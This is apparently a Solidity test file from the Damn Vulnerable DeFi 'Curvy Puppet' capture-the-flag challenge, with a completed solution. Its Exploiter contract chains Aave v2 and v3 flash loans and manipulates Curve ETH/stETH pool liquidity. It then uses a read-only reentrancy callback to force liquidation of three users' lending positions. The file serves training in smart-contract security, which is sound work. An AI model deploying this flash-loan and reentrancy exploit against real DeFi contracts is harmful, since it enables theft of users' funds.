// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 2e24; // original 18
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        address v2Pool = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
        address v3Pool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; 
        Exploiter exploiter = new Exploiter(v2Pool, v3Pool, IERC20(curvePool.lp_token()), curvePool, lending, weth, stETH, [alice, bob, charlie], address(permit2), address(dvt), treasury);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploiter), TREASURY_LP_BALANCE-1);
        weth.transferFrom(treasury, address(exploiter), TREASURY_WETH_BALANCE-1);
        exploiter.exploit();
    }   

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}


struct V2ReserveData {
    ReserveConfigurationMap configuration;
    uint128 liquidityIndex;
    uint128 variableBorrowIndex;
    uint128 currentLiquidityRate;
    uint128 currentVariableBorrowRate;
    uint128 currentStableBorrowRate;
    uint40 lastUpdateTimestamp;
    address aTokenAddress;
    address stableDebtTokenAddress;
    address variableDebtTokenAddress;
    address interestRateStrategyAddress;
    uint8 id;
  }

struct ReserveConfigurationMap {
    uint256 data;
}

struct V3ReserveData {
    ReserveConfigurationMap configuration;
    uint128 liquidityIndex;
    uint128 currentLiquidityRate;
    uint128 variableBorrowIndex;
    uint128 currentVariableBorrowRate;
    uint128 currentStableBorrowRate;
    uint40 lastUpdateTimestamp;
    uint16 id;
    address aTokenAddress;
    address stableDebtTokenAddress;
    address variableDebtTokenAddress;
    address interestRateStrategyAddress;
    uint128 accruedToTreasury;
    uint128 unbacked;
    uint128 isolationModeTotalDebt;
}

interface V2Pool {
    function flashLoan(
    address receiverAddress,
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata modes,
    address onBehalfOf,
    bytes calldata params,
    uint16 referralCode
  ) external;

  function getReserveData(address asset) external view returns (V2ReserveData memory);
}

interface V3Pool {
    function getReserveData(address asset) external view returns (V3ReserveData memory);

    function flashLoanSimple(
    address receiverAddress,
    address asset,
    uint256 amount,
    bytes calldata params,
    uint16 referralCode
  ) external;
}

contract Exploiter {

    IERC20 lp_token;
    IStableSwap curvePool;
    CurvyPuppetLending lending;
    V2Pool v2Pool;
    V3Pool v3Pool;
    WETH weth;
    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    IERC20 stETH;
    uint256 v2WETHTotal;
    uint256 v3WETHTotal;
    address[3] users;
    address permit2;
    address dvt;
    address treasury;
    bool attacked;

    constructor(address _v2Pool, address _v3Pool, IERC20 _lp_token, IStableSwap _curvePool, CurvyPuppetLending _lending, WETH _weth, IERC20 _stETH, address[3] memory _users, address _permit2, address _dvt, address _treasury) payable {
        lp_token = _lp_token;
        curvePool = _curvePool;
        lending = _lending;
        v2Pool = V2Pool(_v2Pool);
        v3Pool = V3Pool(_v3Pool);
        weth = _weth;
        stETH = _stETH;
        permit2 = _permit2;
        dvt = _dvt;
        treasury = _treasury;
        users = _users;

        V2ReserveData memory data2 = v2Pool.getReserveData(address(weth));
        V3ReserveData memory data3 = v3Pool.getReserveData(address(weth));
        
        v2WETHTotal = weth.balanceOf(data2.aTokenAddress);
        v3WETHTotal = weth.balanceOf(data3.aTokenAddress);


        IERC20(lp_token).approve(permit2, type(uint256).max);
        IPermit2(permit2).approve({token:address(lp_token), 
                                   spender:address(lending),
                                   amount:3e18,
                                   expiration:uint48(block.timestamp)});
    }

    function exploit() external {
        v3Pool.flashLoanSimple(address(this), address(weth), v3WETHTotal, "", 0);
    }


    function executeOperation(address[] calldata, uint256[] calldata amounts, uint256[] calldata premiums, address, bytes calldata) external returns (bool) {
        
        
        require(amounts.length == 1, "asset length not 1");
        require(premiums.length == 1, "asset length not 1");
        uint256 borrowedAmount = v2WETHTotal + v3WETHTotal;
        weth.withdraw(borrowedAmount);

        uint256 lpAdded = curvePool.add_liquidity{value:borrowedAmount}([borrowedAmount, 0], 0);
        curvePool.remove_liquidity_imbalance([uint256(1e20), uint256(3554e19)], lpAdded);
        curvePool.remove_liquidity_one_coin(lp_token.balanceOf(address(this)) - 3e18, 0, 0);

        weth.deposit{value:address(this).balance}();
        weth.approve(msg.sender, amounts[0] + premiums[0]);

        return true;
    }


    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata) external returns (bool) {
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint256[](1);
        assets[0] = asset;
        amounts[0] = v2WETHTotal;
        modes[0] = 0;

        v2Pool.flashLoan(address(this), assets, amounts, modes, address(0), "", 0);

        uint256 totalOwed = amount + premium;
        weth.approve(msg.sender, totalOwed);

        return true;
    }

    receive() external payable {
        
        if ((msg.sender != address(weth)) && (!attacked)) {
            
            for (uint256 i = 0; i < 3; i++) {
                lending.liquidate(users[i]);
            }
            uint256 collateral = IERC20(dvt).balanceOf(address(this));
            IERC20(dvt).transfer(treasury, collateral);
            attacked = true;
        }   
        
    }

}